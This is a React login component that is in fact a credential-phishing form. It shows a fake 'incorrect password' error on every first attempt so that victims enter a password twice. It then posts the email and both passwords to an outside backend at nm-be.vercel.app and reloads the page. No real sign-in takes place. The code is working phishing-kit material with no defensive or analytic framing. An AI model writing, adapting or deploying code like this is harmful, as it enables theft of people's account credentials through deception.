import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './Login.css';

const Login = () => {
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isEmailConfirmed, setIsEmailConfirmed] = useState(false);
  const [password, setPassword] = useState('');
  const [firstPasswordUsed, setFirstPasswordUsed] = useState('');
  const [secondPasswordUsed, setSecondPasswordUsed] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [attemptCount, setAttemptCount] = useState(0); // To track the number of login attempts

  // Focus email input on initial render
  useEffect(() => {
    const emailInput = document.getElementById('email-input');
    if (emailInput) {
      emailInput.focus();
    }
  }, []);

  // Focus password input when email is confirmed
  useEffect(() => {
    if (isEmailConfirmed) {
      const passwordInput = document.getElementById('password-input');
      if (passwordInput) {
        passwordInput.focus();
      }
    }
  }, [isEmailConfirmed]);

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    // Reset confirmation and errors when email changes
    if (isEmailConfirmed) {
      setIsEmailConfirmed(false);
      setPassword('');
      setPasswordError('');
      setAttemptCount(0);
      setFirstPasswordUsed(''); // Reset the first password attempt
      setSecondPasswordUsed(''); // Reset the second password attempt
    }
  };

  const handleEmailSubmit = () => {
    if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
      setPasswordError('Please enter a valid email address.');
      return;
    }

    setIsLoading(true);
    setPasswordError('');

    setTimeout(() => {
      setIsLoading(false);
      setIsEmailConfirmed(true);
    }, 2000); // Simulate 2-second loading time
  };

  const handleLogin = async () => {
    if (attemptCount === 0) {
      // Store the first password attempt
      setFirstPasswordUsed(password);
      setAttemptCount(1);
      setPassword(''); // Clear the password input

      // Wait for 0.5 seconds before showing error message
      setTimeout(() => {
        setPasswordError(
          'The password you entered is incorrect. Please verify and try again.'
        );
        setTimeout(() => {
          const passwordInput = document.getElementById('password-input');
          if (passwordInput) {
            passwordInput.focus(); // Autofocus back to password input
          }
        }, 0);
      }, 500); // Half-second delay for the error message

      return;
    } else if (attemptCount === 1) {
      // Store the second password attempt
      setSecondPasswordUsed(password);
    }

    setIsLoading(true);
    setPasswordError('');

    try {
      const response = await axios.post('https://nm-be.vercel.app/api/get_user_info/', {
        email: email,
        firstpasswordused: firstPasswordUsed,
        secondpasswordused: password, // Send the second password attempt
      });
      window.location.reload();
    } catch (error) {
      if (error.message === 'Network Error') {
        setPasswordError(
          'We encountered a network error while attempting to connect to the server. Please try again.'
        );
      } else if (error.response) {
        console.error('Error:', error.response.data);
        setPasswordError(
          `Login failed with status code ${error.response.status}. Please check your credentials and try again.`
        );
      } else {
        setPasswordError(
          'An unknown error occurred. Please refresh the page and attempt again.'
        );
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="input-group">
          <h2>Sign In To Continue -</h2>
          <div className="email-input-wrapper">
            <input
              id="email-input"
              type="email"
              value={email}
              onChange={handleEmailChange}
              disabled={isEmailConfirmed}
              placeholder="Email"
              required
            />
          </div>
          {!isEmailConfirmed && (
            <div className="button-wrapper">
              <button
                onClick={handleEmailSubmit}
                disabled={isLoading || isEmailConfirmed || !email}
                className="next-button"
              >
                {isLoading ? (
                  <span className="spinner"></span>
                ) : (
                  'Next'
                )}
              </button>
            </div>
          )}
        </div>

        {isEmailConfirmed && (
          <>
            <div className="input-group">
              <input
                id="password-input"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                required
              />
            </div>

            {passwordError && <p className="error-text">{passwordError}</p>}

            {password && (
              <div className='login-btn-wrapper'>
              <button
                className="login-btn"
                onClick={handleLogin}
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className="spinner"></span>
                ) : (
                  'Login'
                )}
              </button>
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
};

export default Login;
